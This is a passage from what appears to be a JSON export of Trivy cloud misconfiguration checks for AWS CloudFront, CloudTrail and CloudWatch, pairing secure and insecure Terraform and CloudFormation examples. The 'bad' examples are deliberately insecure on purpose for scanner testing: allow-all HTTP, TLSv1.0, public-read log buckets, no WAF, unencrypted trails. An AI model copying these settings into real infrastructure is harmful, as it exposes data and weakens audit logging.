aws_s3_bucket.primary.bucket_regional_domain_name\n          origin_id   = \"primaryS3\"\n\n          s3_origin_config {\n            origin_access_identity = aws_cloudfront_origin_access_identity.default.cloudfront_access_identity_path\n          }\n        }\n\n        origin {\n          domain_name = aws_s3_bucket.failover.bucket_regional_domain_name\n          origin_id   = \"failoverS3\"\n\n          s3_origin_config {\n            origin_access_identity = aws_cloudfront_origin_access_identity.default.cloudfront_access_identity_path\n          }\n        }\n\n        default_cache_behavior {\n          target_origin_id = \"groupS3\"\n        }\n\n        web_acl_id = \"waf_id\"\n      }\n  bad:\n    - |-\n      resource \"aws_cloudfront_distribution\" \"bad_example\" {\n        origin_group {\n          origin_id = \"groupS3\"\n\n          failover_criteria {\n            status_codes = [403, 404, 500, 502]\n          }\n\n          member {\n            origin_id = \"primaryS3\"\n          }\n        }\n\n        origin {\n          domain_name = aws_s3_bucket.primary.bucket_regional_domain_name\n          origin_id   = \"primaryS3\"\n\n          s3_origin_config {\n            origin_access_identity = aws_cloudfront_origin_access_identity.default.cloudfront_access_identity_path\n          }\n        }\n\n        origin {\n          domain_name = aws_s3_bucket.failover.bucket_regional_domain_name\n          origin_id   = \"failoverS3\"\n\n          s3_origin_config {\n            origin_access_identity = aws_cloudfront_origin_access_identity.default.cloudfront_access_identity_path\n          }\n        }\n\n        default_cache_behavior {\n          target_origin_id = \"groupS3\"\n        }\n      }\n",
        "file_name": "enable_waf.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/cloudfront/enable_waf.yaml",
        "local_path": "aws/cloudfront/enable_waf.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::CloudFront::Distribution\n    Properties:\n      DistributionConfig:\n        DefaultCacheBehavior:\n          TargetOriginId: target\n          ViewerProtocolPolicy: https-only\n        Enabled: true\n        Logging:\n          Bucket: logging-bucket\n        Origins:\n          - DomainName: https://some.domain\n            Id: somedomain1\n        WebACLId: waf_id"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::CloudFront::Distribution\n    Properties:\n      DistributionConfig:\n        DefaultCacheBehavior:\n          TargetOriginId: target\n          ViewerProtocolPolicy: https-only\n        Enabled: true\n        Logging:\n          Bucket: logging-bucket\n        Origins:\n          - DomainName: https://some.domain\n            Id: somedomain1"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/cloudfront_distribution#web_acl_id"
            ],
            "good": [
              "resource \"aws_cloudfront_distribution\" \"good_example\" {\n\n  origin {\n    domain_name = aws_s3_bucket.primary.bucket_regional_domain_name\n    origin_id   = \"primaryS3\"\n\n    s3_origin_config {\n      origin_access_identity = aws_cloudfront_origin_access_identity.default.cloudfront_access_identity_path\n    }\n  }\n\n  origin {\n    domain_name = aws_s3_bucket.failover.bucket_regional_domain_name\n    origin_id   = \"failoverS3\"\n\n    s3_origin_config {\n      origin_access_identity = aws_cloudfront_origin_access_identity.default.cloudfront_access_identity_path\n    }\n  }\n\n  default_cache_behavior {\n    target_origin_id = \"groupS3\"\n  }\n\n  web_acl_id = \"waf_id\"\n}"
            ],
            "bad": [
              "resource \"aws_cloudfront_distribution\" \"bad_example\" {\n  origin_group {\n    origin_id = \"groupS3\"\n\n    failover_criteria {\n      status_codes = [403, 404, 500, 502]\n    }\n\n    member {\n      origin_id = \"primaryS3\"\n    }\n  }\n\n  origin {\n    domain_name = aws_s3_bucket.primary.bucket_regional_domain_name\n    origin_id   = \"primaryS3\"\n\n    s3_origin_config {\n      origin_access_identity = aws_cloudfront_origin_access_identity.default.cloudfront_access_identity_path\n    }\n  }\n\n  origin {\n    domain_name = aws_s3_bucket.failover.bucket_regional_domain_name\n    origin_id   = \"failoverS3\"\n\n    s3_origin_config {\n      origin_access_identity = aws_cloudfront_origin_access_identity.default.cloudfront_access_identity_path\n    }\n  }\n\n  default_cache_behavior {\n    target_origin_id = \"groupS3\"\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-CLOUDFRONT-ENFORCE_HTTPS",
        "title": "Enforce Https",
        "provider": "aws",
        "service": "cloudfront",
        "language": "terraform",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::CloudFront::Distribution\n          Properties:\n            DistributionConfig:\n              DefaultCacheBehavior:\n                TargetOriginId: target\n                ViewerProtocolPolicy: https-only\n              Enabled: true\n              Logging:\n                Bucket: logging-bucket\n              Origins:\n                - DomainName: https://some.domain\n                  Id: somedomain1\n              WebACLId: waf_id\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::CloudFront::Distribution\n          Properties:\n            DistributionConfig:\n              DefaultCacheBehavior:\n                TargetOriginId: target\n                ViewerProtocolPolicy: allow-all\n              Enabled: true\n              Logging:\n                Bucket: logging-bucket\n              Origins:\n                - DomainName: https://some.domain\n                  Id: somedomain1\n              WebACLId: waf_id\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/cloudfront_distribution#viewer_protocol_policy\n  good:\n    - |-\n      resource \"aws_cloudfront_distribution\" \"good_example\" {\n        default_cache_behavior {\n          viewer_protocol_policy = \"redirect-to-https\"\n        }\n      }\n  bad:\n    - |-\n      resource \"aws_cloudfront_distribution\" \"bad_example\" {\n        default_cache_behavior {\n          viewer_protocol_policy = \"allow-all\"\n        }\n      }\n    - |-\n      resource \"aws_cloudfront_distribution\" \"bad_example\" {\n        default_cache_behavior {\n          viewer_protocol_policy = \"https-only\"\n        }\n        ordered_cache_behavior {\n          viewer_protocol_policy = \"allow-all\"\n        }\n      }\n",
        "file_name": "enforce_https.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/cloudfront/enforce_https.yaml",
        "local_path": "aws/cloudfront/enforce_https.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::CloudFront::Distribution\n    Properties:\n      DistributionConfig:\n        DefaultCacheBehavior:\n          TargetOriginId: target\n          ViewerProtocolPolicy: https-only\n        Enabled: true\n        Logging:\n          Bucket: logging-bucket\n        Origins:\n          - DomainName: https://some.domain\n            Id: somedomain1\n        WebACLId: waf_id"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::CloudFront::Distribution\n    Properties:\n      DistributionConfig:\n        DefaultCacheBehavior:\n          TargetOriginId: target\n          ViewerProtocolPolicy: allow-all\n        Enabled: true\n        Logging:\n          Bucket: logging-bucket\n        Origins:\n          - DomainName: https://some.domain\n            Id: somedomain1\n        WebACLId: waf_id"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/cloudfront_distribution#viewer_protocol_policy"
            ],
            "good": [
              "resource \"aws_cloudfront_distribution\" \"good_example\" {\n  default_cache_behavior {\n    viewer_protocol_policy = \"redirect-to-https\"\n  }\n}"
            ],
            "bad": [
              "resource \"aws_cloudfront_distribution\" \"bad_example\" {\n  default_cache_behavior {\n    viewer_protocol_policy = \"allow-all\"\n  }\n}",
              "resource \"aws_cloudfront_distribution\" \"bad_example\" {\n  default_cache_behavior {\n    viewer_protocol_policy = \"https-only\"\n  }\n  ordered_cache_behavior {\n    viewer_protocol_policy = \"allow-all\"\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-CLOUDFRONT-USE_SECURE_TLS_POLICY",
        "title": "Use Secure Tls Policy",
        "provider": "aws",
        "service": "cloudfront",
        "language": "terraform",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::CloudFront::Distribution\n          Properties:\n            DistributionConfig:\n              DefaultCacheBehavior:\n                TargetOriginId: target\n                ViewerProtocolPolicy: https-only\n              Enabled: true\n              Logging:\n                Bucket: logging-bucket\n              Origins:\n                - DomainName: https://some.domain\n                  Id: somedomain1\n              ViewerCertificate:\n                MinimumProtocolVersion: TLSv1.2_2021\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::CloudFront::Distribution\n          Properties:\n            DistributionConfig:\n              DefaultCacheBehavior:\n                TargetOriginId: target\n                ViewerProtocolPolicy: https-only\n              Enabled: true\n              Logging:\n                Bucket: logging-bucket\n              Origins:\n                - DomainName: https://some.domain\n                  Id: somedomain1\n              ViewerCertificate:\n                MinimumProtocolVersion: TLSv1.0\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/cloudfront_distribution#minimum_protocol_version\n  good:\n    - |-\n      resource \"aws_cloudfront_distribution\" \"good_example\" {\n        viewer_certificate {\n          cloudfront_default_certificate = false\n          minimum_protocol_version       = \"TLSv1.2_2021\"\n        }\n      }\n    - |-\n      resource \"aws_cloudfront_distribution\" \"good_example\" {\n        viewer_certificate {\n          cloudfront_default_certificate = true\n          minimum_protocol_version       = \"TLSv1.0\"\n        }\n      }\n  bad:\n    - |-\n      resource \"aws_cloudfront_distribution\" \"bad_example\" {\n        viewer_certificate {\n          cloudfront_default_certificate = false\n          minimum_protocol_version       = \"TLSv1.0\"\n        }\n      }\n    - |-\n      resource \"aws_cloudfront_distribution\" \"bad_example\" {\n        viewer_certificate {\n          cloudfront_default_certificate = false\n        }\n      }\n",
        "file_name": "use_secure_tls_policy.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/cloudfront/use_secure_tls_policy.yaml",
        "local_path": "aws/cloudfront/use_secure_tls_policy.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::CloudFront::Distribution\n    Properties:\n      DistributionConfig:\n        DefaultCacheBehavior:\n          TargetOriginId: target\n          ViewerProtocolPolicy: https-only\n        Enabled: true\n        Logging:\n          Bucket: logging-bucket\n        Origins:\n          - DomainName: https://some.domain\n            Id: somedomain1\n        ViewerCertificate:\n          MinimumProtocolVersion: TLSv1.2_2021"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::CloudFront::Distribution\n    Properties:\n      DistributionConfig:\n        DefaultCacheBehavior:\n          TargetOriginId: target\n          ViewerProtocolPolicy: https-only\n        Enabled: true\n        Logging:\n          Bucket: logging-bucket\n        Origins:\n          - DomainName: https://some.domain\n            Id: somedomain1\n        ViewerCertificate:\n          MinimumProtocolVersion: TLSv1.0"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/cloudfront_distribution#minimum_protocol_version"
            ],
            "good": [
              "resource \"aws_cloudfront_distribution\" \"good_example\" {\n  viewer_certificate {\n    cloudfront_default_certificate = false\n    minimum_protocol_version       = \"TLSv1.2_2021\"\n  }\n}",
              "resource \"aws_cloudfront_distribution\" \"good_example\" {\n  viewer_certificate {\n    cloudfront_default_certificate = true\n    minimum_protocol_version       = \"TLSv1.0\"\n  }\n}"
            ],
            "bad": [
              "resource \"aws_cloudfront_distribution\" \"bad_example\" {\n  viewer_certificate {\n    cloudfront_default_certificate = false\n    minimum_protocol_version       = \"TLSv1.0\"\n  }\n}",
              "resource \"aws_cloudfront_distribution\" \"bad_example\" {\n  viewer_certificate {\n    cloudfront_default_certificate = false\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-CLOUDTRAIL-ENABLE_ALL_REGIONS",
        "title": "Enable All Regions",
        "provider": "aws",
        "service": "cloudtrail",
        "language": "terraform",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::CloudTrail::Trail\n          Properties:\n            IsLogging: true\n            IsMultiRegionTrail: true\n            S3BucketName: CloudtrailBucket\n            S3KeyPrefix: /trailing\n            TrailName: Cloudtrail\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::CloudTrail::Trail\n          Properties:\n            IsLogging: true\n            IsMultiRegionTrail: false\n            S3BucketName: CloudtrailBucket\n            S3KeyPrefix: /trailing\n            TrailName: Cloudtrail\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/cloudtrail#is_multi_region_trail\n  good:\n    - |-\n      resource \"aws_cloudtrail\" \"good_example\" {\n        is_multi_region_trail = true\n      }\n  bad:\n    - |-\n      resource \"aws_cloudtrail\" \"bad_example\" {\n\n      }\n",
        "file_name": "enable_all_regions.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/cloudtrail/enable_all_regions.yaml",
        "local_path": "aws/cloudtrail/enable_all_regions.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::CloudTrail::Trail\n    Properties:\n      IsLogging: true\n      IsMultiRegionTrail: true\n      S3BucketName: CloudtrailBucket\n      S3KeyPrefix: /trailing\n      TrailName: Cloudtrail"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::CloudTrail::Trail\n    Properties:\n      IsLogging: true\n      IsMultiRegionTrail: false\n      S3BucketName: CloudtrailBucket\n      S3KeyPrefix: /trailing\n      TrailName: Cloudtrail"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/cloudtrail#is_multi_region_trail"
            ],
            "good": [
              "resource \"aws_cloudtrail\" \"good_example\" {\n  is_multi_region_trail = true\n}"
            ],
            "bad": [
              "resource \"aws_cloudtrail\" \"bad_example\" {\n\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-CLOUDTRAIL-ENABLE_LOG_VALIDATION",
        "title": "Enable Log Validation",
        "provider": "aws",
        "service": "cloudtrail",
        "language": "terraform",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::CloudTrail::Trail\n          Properties:\n            EnableLogFileValidation: true\n            IsLogging: true\n            IsMultiRegionTrail: true\n            S3BucketName: CloudtrailBucket\n            S3KeyPrefix: /trailing\n            TrailName: Cloudtrail\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::CloudTrail::Trail\n          Properties:\n            IsLogging: true\n            IsMultiRegionTrail: false\n            S3BucketName: CloudtrailBucket\n            S3KeyPrefix: /trailing\n            TrailName: Cloudtrail\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/cloudtrail#enable_log_file_validation\n  good:\n    - |-\n      resource \"aws_cloudtrail\" \"good_example\" {\n        enable_log_file_validation = true\n      }\n  bad:\n    - |-\n      resource \"aws_cloudtrail\" \"bad_example\" {\n      }\n",
        "file_name": "enable_log_validation.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/cloudtrail/enable_log_validation.yaml",
        "local_path": "aws/cloudtrail/enable_log_validation.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::CloudTrail::Trail\n    Properties:\n      EnableLogFileValidation: true\n      IsLogging: true\n      IsMultiRegionTrail: true\n      S3BucketName: CloudtrailBucket\n      S3KeyPrefix: /trailing\n      TrailName: Cloudtrail"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::CloudTrail::Trail\n    Properties:\n      IsLogging: true\n      IsMultiRegionTrail: false\n      S3BucketName: CloudtrailBucket\n      S3KeyPrefix: /trailing\n      TrailName: Cloudtrail"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/cloudtrail#enable_log_file_validation"
            ],
            "good": [
              "resource \"aws_cloudtrail\" \"good_example\" {\n  enable_log_file_validation = true\n}"
            ],
            "bad": [
              "resource \"aws_cloudtrail\" \"bad_example\" {\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-CLOUDTRAIL-ENCRYPTION_CUSTOMER_KEY",
        "title": "Encryption Customer Key",
        "provider": "aws",
        "service": "cloudtrail",
        "language": "terraform",
        "yaml_content": "cloudformation:\n  links:\n    - https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-resource-cloudtrail-trail.html#cfn-cloudtrail-trail-kmskeyid\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::CloudTrail::Trail\n          Properties:\n            IsLogging: true\n            IsMultiRegionTrail: true\n            KmsKeyId: alias/CloudtrailKey\n            S3BucketName: CloudtrailBucket\n            S3KeyPrefix: /trailing\n            TrailName: Cloudtrail\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::CloudTrail::Trail\n          Properties:\n            IsLogging: true\n            IsMultiRegionTrail: false\n            S3BucketName: CloudtrailBucket\n            S3KeyPrefix: /trailing\n            TrailName: Cloudtrail\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/cloudtrail#kms_key_id\n  good:\n    - |-\n      resource \"aws_kms_key\" \"trail\" {\n        enable_key_rotation = true\n      }\n      resource \"aws_kms_alias\" \"trail\" {\n        name          = \"alias/trail\"\n        target_key_id = aws_kms_key.trail.key_id\n      }\n\n      resource \"aws_cloudtrail\" \"good_example\" {\n        kms_key_id = aws_kms_alias.trail.arn\n      }\n  bad:\n    - |-\n      resource \"aws_cloudtrail\" \"bad_example\" {\n      }\n",
        "file_name": "encryption_customer_key.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/cloudtrail/encryption_customer_key.yaml",
        "local_path": "aws/cloudtrail/encryption_customer_key.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "links": [
              "https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-resource-cloudtrail-trail.html#cfn-cloudtrail-trail-kmskeyid"
            ],
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::CloudTrail::Trail\n    Properties:\n      IsLogging: true\n      IsMultiRegionTrail: true\n      KmsKeyId: alias/CloudtrailKey\n      S3BucketName: CloudtrailBucket\n      S3KeyPrefix: /trailing\n      TrailName: Cloudtrail"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::CloudTrail::Trail\n    Properties:\n      IsLogging: true\n      IsMultiRegionTrail: false\n      S3BucketName: CloudtrailBucket\n      S3KeyPrefix: /trailing\n      TrailName: Cloudtrail"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/cloudtrail#kms_key_id"
            ],
            "good": [
              "resource \"aws_kms_key\" \"trail\" {\n  enable_key_rotation = true\n}\nresource \"aws_kms_alias\" \"trail\" {\n  name          = \"alias/trail\"\n  target_key_id = aws_kms_key.trail.key_id\n}\n\nresource \"aws_cloudtrail\" \"good_example\" {\n  kms_key_id = aws_kms_alias.trail.arn\n}"
            ],
            "bad": [
              "resource \"aws_cloudtrail\" \"bad_example\" {\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-CLOUDTRAIL-ENSURE_CLOUDWATCH_INTEGRATION",
        "title": "Ensure Cloudwatch Integration",
        "provider": "aws",
        "service": "cloudtrail",
        "language": "terraform",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodExampleTrail:\n          Type: AWS::CloudTrail::Trail\n          Properties:\n            CloudWatchLogsLogGroupArn: arn:aws:logs:us-east-1:123456789012:log-group:CloudTrail/DefaultLogGroup:*\n            TrailName: Cloudtrail\n  bad:\n    - |-\n      Resources:\n        BadExampleTrail:\n          Type: AWS::CloudTrail::Trail\n          Properties:\n            TrailName: Cloudtrail\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/cloudtrail\n  good:\n    - |-\n      resource \"aws_cloudtrail\" \"good_example\" {\n        cloud_watch_logs_group_arn = \"${aws_cloudwatch_log_group.example.arn}:*\"\n      }\n\n      resource \"aws_cloudwatch_log_group\" \"example\" {\n        name = \"Example\"\n      }\n  bad:\n    - |-\n      resource \"aws_cloudtrail\" \"bad_example\" {\n      }\n",
        "file_name": "ensure_cloudwatch_integration.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/cloudtrail/ensure_cloudwatch_integration.yaml",
        "local_path": "aws/cloudtrail/ensure_cloudwatch_integration.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodExampleTrail:\n    Type: AWS::CloudTrail::Trail\n    Properties:\n      CloudWatchLogsLogGroupArn: arn:aws:logs:us-east-1:123456789012:log-group:CloudTrail/DefaultLogGroup:*\n      TrailName: Cloudtrail"
            ],
            "bad": [
              "Resources:\n  BadExampleTrail:\n    Type: AWS::CloudTrail::Trail\n    Properties:\n      TrailName: Cloudtrail"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/cloudtrail"
            ],
            "good": [
              "resource \"aws_cloudtrail\" \"good_example\" {\n  cloud_watch_logs_group_arn = \"${aws_cloudwatch_log_group.example.arn}:*\"\n}\n\nresource \"aws_cloudwatch_log_group\" \"example\" {\n  name = \"Example\"\n}"
            ],
            "bad": [
              "resource \"aws_cloudtrail\" \"bad_example\" {\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-CLOUDTRAIL-NO_PUBLIC_LOG_ACCESS",
        "title": "No Public Log Access",
        "provider": "aws",
        "service": "cloudtrail",
        "language": "terraform",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodExampleBucket:\n          Type: AWS::S3::Bucket\n          Properties:\n            AccessControl: Private\n            BucketName: my-bucket\n\n        GoodExampleTrail:\n          Type: AWS::CloudTrail::Trail\n          Properties:\n            IsLogging: true\n            S3BucketName: my-bucket\n            TrailName: Cloudtrail\n  bad:\n    - |-\n      Resources:\n        BadExampleBucket:\n          Type: AWS::S3::Bucket\n          Properties:\n            AccessControl: AuthenticatedRead\n            BucketName: my-bucket\n\n        BadExampleTrail:\n          Type: AWS::CloudTrail::Trail\n          Properties:\n            IsLogging: true\n            S3BucketName: my-bucket\n            TrailName: Cloudtrail\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/cloudtrail#is_multi_region_trail\n  good:\n    - |-\n      resource \"aws_cloudtrail\" \"good_example\" {\n        s3_bucket_name = aws_s3_bucket.example.id\n      }\n\n      resource \"aws_s3_bucket\" \"example\" {\n        bucket = \"example\"\n        acl    = \"private\"\n      }\n  bad:\n    - |-\n      resource \"aws_cloudtrail\" \"bad_example\" {\n        s3_bucket_name = aws_s3_bucket.example.id\n      }\n\n      resource \"aws_s3_bucket\" \"example\" {\n        bucket = \"example\"\n        acl    = \"public-read\"\n      }\n",
        "file_name": "no_public_log_access.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/cloudtrail/no_public_log_access.yaml",
        "local_path": "aws/cloudtrail/no_public_log_access.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodExampleBucket:\n    Type: AWS::S3::Bucket\n    Properties:\n      AccessControl: Private\n      BucketName: my-bucket\n\n  GoodExampleTrail:\n    Type: AWS::CloudTrail::Trail\n    Properties:\n      IsLogging: true\n      S3BucketName: my-bucket\n      TrailName: Cloudtrail"
            ],
            "bad": [
              "Resources:\n  BadExampleBucket:\n    Type: AWS::S3::Bucket\n    Properties:\n      AccessControl: AuthenticatedRead\n      BucketName: my-bucket\n\n  BadExampleTrail:\n    Type: AWS::CloudTrail::Trail\n    Properties:\n      IsLogging: true\n      S3BucketName: my-bucket\n      TrailName: Cloudtrail"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/cloudtrail#is_multi_region_trail"
            ],
            "good": [
              "resource \"aws_cloudtrail\" \"good_example\" {\n  s3_bucket_name = aws_s3_bucket.example.id\n}\n\nresource \"aws_s3_bucket\" \"example\" {\n  bucket = \"example\"\n  acl    = \"private\"\n}"
            ],
            "bad": [
              "resource \"aws_cloudtrail\" \"bad_example\" {\n  s3_bucket_name = aws_s3_bucket.example.id\n}\n\nresource \"aws_s3_bucket\" \"example\" {\n  bucket = \"example\"\n  acl    = \"public-read\"\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-CLOUDTRAIL-REQUIRE_BUCKET_ACCESS_LOGGING",
        "title": "Require Bucket Access Logging",
        "provider": "aws",
        "service": "cloudtrail",
        "language": "terraform",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodExampleBucket:\n          Type: AWS::S3::Bucket\n          Properties:\n            BucketName: my-bucket\n            LoggingConfiguration:\n              DestinationBucketName: logging-bucket\n              LogFilePrefix: accesslogs/\n\n        GoodExampleTrail:\n          Type: AWS::CloudTrail::Trail\n          Properties:\n            IsLogging: true\n            S3BucketName: my-bucket\n            TrailName: Cloudtrail\n  bad:\n    - |-\n      Resources:\n        BadExampleBucket:\n          Type: AWS::S3::Bucket\n          Properties:\n            BucketName: my-bucket\n\n        BadExampleTrail:\n          Type: AWS::CloudTrail::Trail\n          Properties:\n            IsLogging: true\n            S3BucketName: my-bucket\n            TrailName: Cloudtrail\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/cloudtrail#is_multi_region_trail\n  good:\n    - |-\n      resource \"aws_cloudtrail\" \"good_example\" {\n        s3_bucket_name = aws_s3_bucket.example.id\n      }\n\n      resource \"aws_s3_bucket\" \"example\" {\n        bucket = \"example\"\n        logging {\n          target_bucket = \"target-bucket\"\n        }\n      }\n  bad:\n    - |-\n      resource \"aws_cloudtrail\" \"bad_example\" {\n        s3_bucket_name = aws_s3_bucket.example.id\n      }\n\n      resource \"aws_s3_bucket\" \"example\" {\n        bucket = \"example\"\n      }\n",
        "file_name": "require_bucket_access_logging.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/cloudtrail/require_bucket_access_logging.yaml",
        "local_path": "aws/cloudtrail/require_bucket_access_logging.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodExampleBucket:\n    Type: AWS::S3::Bucket\n    Properties:\n      BucketName: my-bucket\n      LoggingConfiguration:\n        DestinationBucketName: logging-bucket\n        LogFilePrefix: accesslogs/\n\n  GoodExampleTrail:\n    Type: AWS::CloudTrail::Trail\n    Properties:\n      IsLogging: true\n      S3BucketName: my-bucket\n      TrailName: Cloudtrail"
            ],
            "bad": [
              "Resources:\n  BadExampleBucket:\n    Type: AWS::S3::Bucket\n    Properties:\n      BucketName: my-bucket\n\n  BadExampleTrail:\n    Type: AWS::CloudTrail::Trail\n    Properties:\n      IsLogging: true\n      S3BucketName: my-bucket\n      TrailName: Cloudtrail"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/cloudtrail#is_multi_region_trail"
            ],
            "good": [
              "resource \"aws_cloudtrail\" \"good_example\" {\n  s3_bucket_name = aws_s3_bucket.example.id\n}\n\nresource \"aws_s3_bucket\" \"example\" {\n  bucket = \"example\"\n  logging {\n    target_bucket = \"target-bucket\"\n  }\n}"
            ],
            "bad": [
              "resource \"aws_cloudtrail\" \"bad_example\" {\n  s3_bucket_name = aws_s3_bucket.example.id\n}\n\nresource \"aws_s3_bucket\" \"example\" {\n  bucket = \"example\"\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-CLOUDWATCH-LOG_GROUP_CUSTOMER_KEY",
        "title": "Log Group Customer Key",
        "provider": "aws",
        "service": "cloudwatch",
        "language": "terraform",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::Logs::LogGroup\n          Properties:\n            KmsKeyId: arn:aws:kms:us-west-2:111122223333:key/lambdalogging\n            LogGroupName: aws/lambda/goodExample\n            RetentionInDays: 30\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::Logs::LogGroup\n          Properties:\n            KmsKeyId: \"\"\n            LogGroupName: aws/lambda/badExample\n            RetentionInDays: 30\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/cloudwatch_log_group#kms_key_id\n  good:\n    - |-\n      resource \"aws_kms_key\" \"cloudwatch\" {\n        enable_key_rotation = true\n      }\n\n      resource \"aws_kms_alias\" \"cloudwatch\" {\n        name          = \"alias/cloudwatch\"\n        target_key_id = aws_kms_key.cloudwatch.key_id\n      }\n      resource \"aws_cloudwatch_log_group\" \"good_example\" {\n        name = \"good_example\"\n\n        kms_key_id = aws_kms_alias.cloudwatch.arn\n      }\n  bad:\n    - |-\n      resource \"aws_cloudwatch_log_group\" \"bad_example\" {\n        name = \"bad_example\"\n\n      }\n",
        "file_name": "log_group_customer_key.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/cloudwatch/log_group_customer_key.yaml",
        "local_path": "aws/cloudwatch/log_group_customer_key.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::Logs::LogGroup\n    Properties:\n      KmsKeyId: arn:aws:kms:us-west-2:111122223333:key/lambdalogging\n      LogGroupName: aws/lambda/goodExample\n      RetentionInDays: 30"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::Logs::LogGroup\n    Properties:\n      KmsKeyId: \"\"\n      LogGroupName: aws/lambda/badExample\n      RetentionInDays: 30"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/cloudwatch_log_group#kms_key_id"
            ],
            "good": [
